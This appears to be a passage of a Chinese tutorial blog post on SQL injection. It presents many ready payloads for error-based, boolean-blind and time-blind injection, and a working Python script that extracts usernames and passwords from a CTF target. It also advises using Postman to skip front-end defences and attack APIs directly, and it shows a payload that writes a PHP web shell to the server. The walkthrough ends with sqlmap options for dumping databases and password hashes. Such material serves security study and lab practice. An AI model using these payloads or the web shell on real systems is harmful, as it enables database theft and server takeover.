+<p>​	报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</p>
+<h5 id="常用的函数"><a href="#常用的函数" class="headerlink" title="常用的函数"></a>常用的函数</h5><p>（1）extractvalue()</p>
+<p>（2）updataxml()</p>
+<p>（3）count()+rand()+floor()+group by()导致的主键重复</p>
+<h6 id="extractvalue（）"><a href="#extractvalue（）" class="headerlink" title="extractvalue（）"></a>extractvalue（）</h6><p>extractvalue（xml_document,xpath_string）</p>
+<p>第一个参数是xml文档对象的名称</p>
+<p>第二个参数作用是从xml文档对象中返回查询到的字符串值，返回结果长度限制在32位字符。</p>
+<p>payload：extractvalue(null,concat(0x7e,(sqli_inject),0x7e))</p>
+<p>注：利用extractvalue（）对数据进行一个排序，指定第一个参数为null，可以换成1、#或者其他符号，使其报错，并执行第二个参数语句。0x7e表示”-“号。</p>
+<h6 id="updetaxml（）"><a href="#updetaxml（）" class="headerlink" title="updetaxml（）"></a>updetaxml（）</h6><p>updatexml（xml_document,xpath_string,new_value）</p>
+<p>第一个参数，xml文档名称</p>
+<p>第二个参数，xpath格式字符串</p>
+<p>第三个参数，替换查找到的符合条件的数据</p>
+<pre><code>    作用是，改变文档中符合条件的节点的值
+</code></pre>
+<p>payload格式如下:</p>
+<p>updatexml(1,concat(0x7e,(sqli_inject),0x7e),1)</p>
+<h5 id="实际演示"><a href="#实际演示" class="headerlink" title="实际演示"></a>实际演示</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 &#x27;and (extractvalue(1,concat(0x7e,(select user()),0x7e)))-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224101324836.png" alt="image-20231224101324836"></p>
+<h5 id="1-floor报错注入"><a href="#1-floor报错注入" class="headerlink" title="1.floor报错注入"></a>1.floor报错注入</h5><p><strong>floor()报错注入的原因</strong>是   <strong>group by</strong>在向临时表插入数据时，由于   **rand()**多次计算导致插入临时表时主键重复，从而报错，又因为报错前   **concat()**中的SQL语句或函数被执行，所以该语句报错且被抛出的主键是SQL语句或数执行后的结果。</p>
+<p> floor()函数：对传入的值进行向下取整操作，并返回结果，如floor(1.999),则返回1.</p>
+<p>rand()函数，返回随机数</p>
+<p>rand(x)函数，x在这里代表参数，当rand()函数有了参数后，生成的就是伪随机数，什么意思呢？比如你使用rand(0)产生的第一个随机数产生的随机数相同，也就是当rand(x)这个参数x已知的时候我们就能知道，</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/c5c3670460544da39472cf2bdad747c9.png" alt="img">    </p>
+<p>同样的，刚才我们说的是使用rand(0)产生的第一个随机数都相同，产生的第n个随机数其实都相同，但是这n个随机数之间可能不相同</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/9121cb077ff1467f876c50c6892ccd9b.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">简单来说就是rand()函数有参数，即rand(x)时，rand(x)产生的就是伪随机的一个数组，数组中元素的值由x决定，就是你使用rand(x)产生的第n次数据，与我使用rand(x)产生的第n次数据是相同的 </span><br></pre></td></tr></table></figure>
+
+<p><strong>count(*)函数</strong>，返回值的条目，与<strong>count()<strong>的区别在于其不排除NULL，count()如果统计到NULL,返回的结果即为NULL，返回列数。如下，就是统计</strong>user表的内容条数</strong></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/23eaf7b8cef0473dae044f1cb2d4ece3.png" alt="img"></p>
+<p>​    具体请查看<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_63844103/article/details/128569910">【web安全】——floor报错注入</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224101955130.png" alt="image-20231224101955130"></p>
+<p>csdn例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure>
+
+<p>​    <img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/a04873f68d674b77846b135fa96f626c.png" alt="img">    </p>
+<h5 id="2-extractvalue报错注入（查询）"><a href="#2-extractvalue报错注入（查询）" class="headerlink" title="2.extractvalue报错注入（查询）"></a>2.extractvalue报错注入（查询）</h5><p>格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXTRACTVALUE (XML_document, XPath_string);</span><br></pre></td></tr></table></figure>
+
+<p><strong>第一个参数</strong>：XML_document是String格式，为XML文档对象的名称，文中为Doc</p>
+<p><strong>第二个参数</strong>：XPath_string (Xpath格式的字符串)</p>
+<p><strong>concat</strong>:返回结果为连接参数产生的字符串。</p>
+<p>原理与updatexml格式相似。 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(extractvalue(1,concat(0x7e,(select user()),0x7e)))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102040340.png" alt="image-20231224102040340"></p>
+<p>csdn例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/9206f3c3e01548488f00e41467443ee9.png" alt="img"></p>
+<h5 id="3-updatexml报错注入（修改）"><a href="#3-updatexml报错注入（修改）" class="headerlink" title="3.updatexml报错注入（修改）"></a>3.updatexml报错注入（修改）</h5><p>格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML (XML_document, XPath_string, new_value); </span><br></pre></td></tr></table></figure>
+
+<p><strong>第一个参数</strong>：XML_document是<strong>String格式</strong>，为XML文档对象的名称</p>
+<p><strong>第二个参数</strong>：XPath_string (<strong>Xpath格式的字符串</strong>)</p>
+<p>​		 <a target="_blank" rel="noopener" href="https://baike.baidu.com/item/XPath/5574064">XPath</a>即为XML路径语言（XML Path Language），它是一种用来确定XML文档中某部分位置的语言。</p>
+<p><strong>第三个参数</strong>：new_value，<strong>String格式</strong>，替换查找到的符合条件的数据 </p>
+<p>原理：</p>
+<p>**由于updatexml的第二个参数需要   <strong>Xpath格式</strong>的字符串，以~开头的内容不是xml格式的语法，concat()函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。  **</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102115408.png" alt="image-20231224102115408"></p>
+<p>csdn例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/bb85279b4fbc4de6921bf0859954f919.png" alt="img">    </p>
+<h5 id="4-geometrycollection报错注入"><a href="#4-geometrycollection报错注入" class="headerlink" title="4.geometrycollection报错注入"></a>4.geometrycollection报错注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geometrycollection((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102149354.png" alt="image-20231224102149354"></p>
+<p>csdn例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/a4ee464fd7dd48ee88b7faa0c5385600.png" alt="img">    </p>
+<h5 id="5-multipoint报错注入"><a href="#5-multipoint报错注入" class="headerlink" title="5.multipoint报错注入"></a>5.multipoint报错注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">multipoint((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102214772.png" alt="image-20231224102214772"></p>
+<p>csdn例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/e3b9d9b17dc7488792de7e9af790374a.png" alt="img">    </p>
+<h5 id="6-polygon报错注入"><a href="#6-polygon报错注入" class="headerlink" title="6.polygon报错注入"></a>6.polygon报错注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">polygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102240751.png" alt="image-20231224102240751"></p>
+<p>csdn例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/5cbe6dc8c3fb4378a5009ee5ca0f1ba9.png" alt="img">    </p>
+<h5 id="7-multipolygon报错注入"><a href="#7-multipolygon报错注入" class="headerlink" title="7.multipolygon报错注入"></a>7.multipolygon报错注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">multipolygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102308793.png" alt="image-20231224102308793"></p>
+<p>csdn例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/13bc800adf0e4c6db905bb62c7066aa6.png" alt="img">    </p>
+<h5 id="8-linestring报错注入"><a href="#8-linestring报错注入" class="headerlink" title="8.linestring报错注入"></a>8.linestring报错注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102404855.png" alt="image-20231224102404855"></p>
+<p>csdn例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/bcc78f083f5a45f9980261479bf974a6.png" alt="img">    </p>
+<h5 id="9-multilinestring报错注入"><a href="#9-multilinestring报错注入" class="headerlink" title="9.multilinestring报错注入"></a>9.multilinestring报错注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">multilinestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102433978.png" alt="image-20231224102433978"></p>
+<p>csdn例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/55da9cbcc47148f386419818ec82b166.png" alt="img"></p>
+<h5 id="10-exp报错注入"><a href="#10-exp报错注入" class="headerlink" title="10.exp报错注入"></a>10.exp报错注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp(~(select * from(select user())a))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102504654.png" alt="image-20231224102504654"></p>
+<p>csdn例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/3aad1b75884c4256ad3fa54ed5d57d9c.png" alt="img">    </p>
+<h4 id="Postman与sql注入"><a href="#Postman与sql注入" class="headerlink" title="Postman与sql注入"></a>Postman与sql注入</h4><p>进入网站后如果需要使用网站功能进行sql注入可以使用postman进行协助</p>
+<p>进入网站之后直接键盘点击F12，打开开发者工具，选择网络</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224104441076.png" alt="image-20231224104441076"></p>
+<p>点击开发者工具左上方的删除符号，清空已出现的内容<img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224104547948.png" alt="image-20231224104547948"></p>
+<p>在输入栏内输入正常搜索内容，点击搜索</p>
+<p>然后网络中就会出现一条新的记录</p>
+<p>鼠标右键该记录，选择编辑并重发</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224104921364.png" alt="image-20231224104921364"></p>
+<p>左边便出现该栏：</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224105034465.png" alt="image-20231224105034465"></p>
+<p>直接复制post&#x2F;get后方内容，后续需要用到。</p>
+<p>打开postman，记得登陆一下，windows账号可以直接登陆</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224105422925.png" alt="image-20231224105422925"></p>
+<p>点+号添加一个运行页面</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224105758297.png" alt="image-20231224105758297"></p>
+<p>将刚刚的网址复制到里面，根据开发者工具的post&#x2F;get选择发送方法。</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224110305176.png" alt="image-20231224110305176"></p>
+<p>postman中会直接出现内容，可以根据自身输入的内看出需要更改的部分，api返回的内容会在下方body-Pretty中显示。</p>
+<p>我们便可以更改图中id的内容进行sql注入，流程和正常sql注入一样，使用postman进行sql注入可以直接跳过前端防御直接对api进行攻击而api部分一般防御较少，攻击成功率更高。</p>
+<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p>盲注又可以分为布尔盲注和时间盲注。</p>
+<h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p>该语句很重要，可以通过它来判断数据库中每个字符，通过ascii字符来判断。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;and ascii(substring(database(),1,1))=115--+</span><br></pre></td></tr></table></figure>
+
+<p>盲注python脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#id=1&#x27;and ascii(substring(database(),1,1))=115--+</span><br><span class="line">import requests</span><br><span class="line">session = requests.Session()</span><br><span class="line"># url = &quot;http://192.168.2.70/sqli/Less-8/?id=1&#x27;&quot;</span><br><span class="line">def erfen(url):</span><br><span class="line"> name = &quot;&quot;</span><br><span class="line"> for i in range(1,100):</span><br><span class="line">  a = int(32)</span><br><span class="line">  b = int(128)</span><br><span class="line">  d = (a + b)//2</span><br><span class="line">  while a &lt; b :</span><br><span class="line">   Get = url + &quot;/**/and/**/ascii(substr((select group_concat(id,username,password) from ctfshow_user4 where username=&#x27;flag&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;-- -&quot;.format(i,d)</span><br><span class="line">   res = session.get(Get)</span><br><span class="line">   if &#x27;&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;&#125;&#x27; in res.text:</span><br><span class="line">    a = d + 1</span><br><span class="line">    d = (a + b)//2</span><br><span class="line">   else:</span><br><span class="line">    b = d</span><br><span class="line">    d = (a + b)//2</span><br><span class="line">  if d == 32:</span><br><span class="line">   break</span><br><span class="line">  name += chr(d)</span><br><span class="line">#  return name</span><br><span class="line">  print(name)</span><br><span class="line"># erfen()</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line"> url = &quot;http://4cd4bfb2-24b0-4483-83bf-bad37a9a29b5.challenge.ctf.show/api/v4.php?id=1&#x27;&quot;</span><br><span class="line"> name = erfen(url)</span><br><span class="line">#  print(name)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231223193000982.png" alt="image-20231223193000982"></p>
+<h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><p>​	时间盲注又称延迟注入，适用于页面不会返回错误信息，只会回显一种界面，其主要特征是利用sleep函数让mysql执行时间变长，制造时间延迟，通过页面的响应时间来判断条件是否正确。通常与if(expr1,expr2,expr3)语句结合使用（如果expr1是True，则返回expr2，否则返回expr3）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 判断闭合符号：由于页面无法返回正确或错误的值，所以只能通过if加sleep函来判断闭合</span><br><span class="line">?id=1&#x27; and if(1=2, 1, sleep(3))--+        # 判断是否是单引号闭合，如果是页面会延迟响应3秒</span><br><span class="line">?id=1&quot; and sleep(3)--+                    # 也可以直接使用and拼接sleepl来判断</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 常见的注入语句(Payload)</span><br><span class="line">?id=1&#x27; and if(length(database())&gt;8, sleep(2), 0) --+               # 判断数据库名长度</span><br><span class="line">?id=1&#x27; and if(ascii(substr(database(),1,1))=115,sleep(2),0) --+    # 通过ASCII码，判断数据库的第一个字母，然后通过改变截取的字符，进一步判断库名</span><br><span class="line"># 判断表名</span><br><span class="line">?id=1&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1),1,1))=101,sleep(2),0) --+</span><br><span class="line"># 判断列名</span><br><span class="line">?id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name=&quot;users&quot; and table_schema=database() limit 0,1),1,1))=105,sleep(2),1) --+</span><br></pre></td></tr></table></figure>
+
+<p><strong>时间盲注python中判断是否延时的语句，延时则表示字串正确</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> time.time()-ss&gt;=<span class="number">4</span>:</span><br><span class="line">    flag += i</span><br><span class="line">    <span class="built_in">print</span> (flag)</span><br></pre></td></tr></table></figure>
+<h4 id="文件修改"><a href="#文件修改" class="headerlink" title="文件修改"></a>文件修改</h4><p>执行下方操作时，需要给MySQL根目录下的my.ini文件添加secure_file_priv&#x3D;””</p>
+<p>具体如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">[mysql]</span><br><span class="line">default-character-set=utf8</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line">port=3306</span><br><span class="line">basedir=C:/phpstudy_pro/Extensions/MySQL5.7.26/</span><br><span class="line">datadir=C:/phpstudy_pro/Extensions/MySQL5.7.26/data/</span><br><span class="line">character-set-server=utf8</span><br><span class="line">default-storage-engine=MyIsam</span><br><span class="line">max_connections=100</span><br><span class="line">collation-server=utf8_unicode_ci</span><br><span class="line">init_connect=&#x27;SET NAMES utf8&#x27;</span><br><span class="line">innodb_buffer_pool_size=64M</span><br><span class="line">innodb_flush_log_at_trx_commit=1</span><br><span class="line">innodb_lock_wait_timeout=120</span><br><span class="line">innodb_log_buffer_size=4M</span><br><span class="line">innodb_log_file_size=256M</span><br><span class="line">interactive_timeout=120</span><br><span class="line">join_buffer_size=2M</span><br><span class="line">key_buffer_size=32M</span><br><span class="line">log_error_verbosity=1</span><br><span class="line">max_allowed_packet=16M</span><br><span class="line">max_heap_table_size=64M</span><br><span class="line">myisam_max_sort_file_size=64G</span><br><span class="line">myisam_sort_buffer_size=32M</span><br><span class="line">read_buffer_size=512kb</span><br><span class="line">read_rnd_buffer_size=4M</span><br><span class="line">server_id=1</span><br><span class="line">skip-external-locking=on</span><br><span class="line">sort_buffer_size=256kb</span><br><span class="line">table_open_cache=256</span><br><span class="line">thread_cache_size=16</span><br><span class="line">tmp_table_size=64M</span><br><span class="line">wait_timeout=120</span><br><span class="line">secure_file_priv=&quot;&quot;</span><br><span class="line"></span><br><span class="line">[client]</span><br><span class="line">port=3306</span><br><span class="line">default-character-set=utf8</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,@@datadir,@@secure_file_priv -- -</span><br></pre></td></tr></table></figure>
+
+<p>输入该语句可以查询数据库内容放置位置</p>
+<h3 id="简单病毒"><a href="#简单病毒" class="headerlink" title="简单病毒"></a><em>简单病毒</em></h3><p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231223193846084.png" alt="image-20231223193846084"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,@@datadir,&quot;&lt;?php @system($_GET[a]);  ?&gt;&quot; into outfile &quot;地址&quot; -- -</span><br></pre></td></tr></table></figure>
+
+<p>地址内斜杠需要用双斜杠代替，不然内容传输不过去。</p>
+<h4 id="sql注入工具（sqlmap）"><a href="#sql注入工具（sqlmap）" class="headerlink" title="sql注入工具（sqlmap）"></a>sql注入工具（sqlmap）</h4><ol>
+<li><a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap/archive/refs/tags/1.7.zip">下载地址</a></li>
+</ol>
+<p>sqlmap中有python程序会报毒，解压运行之前请关闭杀毒软件。</p>
+<ol start="2">
+<li>在文件根目录下运行cmd命令</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224091933908.png" alt="image-20231224091933908"></p>
+<ol start="3">
+<li>查看sqlmap命令</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -h</span><br></pre></td></tr></table></figure>
+
+<p>   <img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224092310756.png" alt="image-20231224092310756"></p>
+<p>显示上面内容则表示sqlmap能够正常运行。</p>
+<p>使用方法: python3 sqlmap [选项]</p>
+<p>选项:<br> -h, –help            显示基本帮助消息并退出<br> -hh                   显示高级帮助消息并退出<br> –version             显示程序的版本号并退出<br> -v VERBOSE            详细级别: 0-6(默认为1)</p>
+<p>目标:<br> 为了定义目标,至少需要提供以下一个选项</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-u URL, --url=URL   目标URL(例如 &quot;http://www.site.com/vuln.php?id=1&quot;)</span><br><span class="line">-g GOOGLEDORK       处理Google搜索词结果作为目标URL</span><br></pre></td></tr></table></figure>
+
+<p>请求:<br> 这些选项可以用来指定如何连接到目标URL</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--data=DATA         通过POST发送的数据字符串(例如 &quot;id=1&quot;) </span><br><span class="line">--cookie=COOKIE     HTTP Cookie头的值(例如&quot;PHPSESSID=a8d127e..&quot;)</span><br><span class="line">--random-agent      使用随机选择的HTTP用户代理头值</span><br><span class="line">--proxy=PROXY       使用代理连接到目标URL</span><br><span class="line">--tor               使用Tor匿名网络</span><br><span class="line">--check-tor         检查是否正确使用Tor</span><br></pre></td></tr></table></figure>
+
+<p>注入:<br> 这些选项可以用来指定测试哪些参数,提供自定义注入有效负载和可选篡改脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-p TESTPARAMETER    可测试的参数</span><br><span class="line">--dbms=DBMS         强制后端DBMS为提供的值</span><br></pre></td></tr></table></figure>
+
+<p>检测:<br> 这些选项可以用来自定义检测阶段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--level=LEVEL       测试级别(1-5,默认1)</span><br><span class="line">--risk=RISK         测试风险(1-3,默认1)</span><br></pre></td></tr></table></figure>
+
+<p>技术:<br> 这些选项可以用来微调特定的SQL注入技术测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--technique=TECH..  要使用的SQL注入技术(默认为&quot;BEUSTQ&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>枚举:<br> 这些选项可以用来枚举后端数据库管理系统的信息,结构和表中的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-a, --all           检索所有信息</span><br><span class="line">-b, --banner        检索DBMS版本信息</span><br><span class="line">--current-user      检索DBMS当前用户</span><br><span class="line">--current-db        检索DBMS当前数据库</span><br><span class="line">--passwords         枚举DBMS用户密码哈希</span><br><span class="line">--dbs               枚举DBMS数据库</span><br><span class="line">--tables            枚举DBMS数据库表</span><br><span class="line">--columns           枚举DBMS数据库表字段</span><br><span class="line">--schema            枚举DBMS架构</span><br><span class="line">--dump              转储DBMS数据库表条目</span><br><span class="line">--dump-all          转储所有DBMS数据库表条目</span><br><span class="line">-D DB               要枚举的DBMS数据库</span><br><span class="line">-T TBL              要枚举的DBMS数据库表</span><br><span class="line">-C COL              要枚举的DBMS数据库表字段</span><br></pre></td></tr></table></figure>
+
+<p>操作系统访问:<br> 这些选项可以用来访问后端数据库管理系统底层的操作系统</p>
